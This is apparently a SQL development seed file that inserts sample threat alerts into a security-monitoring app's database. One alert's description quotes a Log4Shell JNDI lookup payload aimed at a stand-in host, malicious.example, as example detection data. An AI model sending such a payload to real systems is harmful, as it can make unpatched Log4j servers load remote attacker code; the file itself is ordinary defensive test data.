-- ============================================================
-- Development seed data
-- DO NOT run in production.
-- Run after all 001–005 migrations.
-- ============================================================

-- ─── Sample threat alerts ─────────────────────────────────────
INSERT INTO public.threat_alerts
    (title, description, severity, threat_type, ai_confidence, is_active, detected_at)
VALUES
    (
        'Mass credential stuffing campaign detected',
        'Automated login attempts using leaked credential lists detected across 12 services. '
        'Source IPs traced to botnet C2 in Eastern Europe. Blocking recommended.',
        'CRITICAL', 'brute_force', 0.9730, TRUE,
        NOW() - INTERVAL '2 hours'
    ),
    (
        'Exposed AWS S3 bucket contains PII',
        'Public S3 bucket "company-backup-2023" found exposing 45,000 customer records '
        'including email addresses and hashed passwords. CVE cross-reference: none.',
        'HIGH', 'data_exposure', 0.8850, TRUE,
        NOW() - INTERVAL '6 hours'
    ),
    (
        'Log4Shell exploitation attempt on port 8080',
        'CVE-2021-44228 JNDI lookup string detected in HTTP User-Agent header targeting '
        'unpatched instances. Payload: ${jndi:ldap://malicious.example/a}.',
        'HIGH', 'exploit', 0.9920, TRUE,
        NOW() - INTERVAL '12 hours'
    ),
    (
        'Suspicious outbound DNS tunnelling',
        'Unusually long DNS query strings (> 200 chars) detected at 3x normal baseline. '
        'Pattern consistent with DNS-over-HTTPS data exfiltration technique.',
        'MEDIUM', 'data_exfiltration', 0.7200, TRUE,
        NOW() - INTERVAL '1 day'
    ),
    (
        'Outdated TLS 1.0 in use on api.internal',
        'Internal service api.internal still negotiates TLS 1.0 connections. '
        'Upgrade to TLS 1.3 required by compliance policy Q3 2024.',
        'MEDIUM', 'misconfiguration', 0.9990, TRUE,
        NOW() - INTERVAL '2 days'
    ),
    (
        'Minor port scan from 192.168.1.105',
        'Internal host performed a SYN scan of 50 ports over 30 seconds. '
        'Could be legitimate asset discovery or early reconnaissance.',
        'LOW', 'port_scan', 0.6100, TRUE,
        NOW() - INTERVAL '3 days'
    ),
    (
        'Phishing domain "cyb0t-login.com" registered',
        'Typosquatting domain targeting Cybot users registered 48 hours ago. '
        'MX records active. Recommend registrar takedown request.',
        'HIGH', 'phishing', 0.8600, FALSE,  -- resolved
        NOW() - INTERVAL '5 days'
    )
ON CONFLICT DO NOTHING;

-- ─── Note on profiles / users ─────────────────────────────────
-- Profiles are auto-created via the handle_new_user() trigger when
-- users sign up through Supabase Auth. Do not manually insert here.

-- ─── Verify seed ──────────────────────────────────────────────
SELECT severity, COUNT(*) AS count
FROM public.threat_alerts
GROUP BY severity
ORDER BY count DESC;
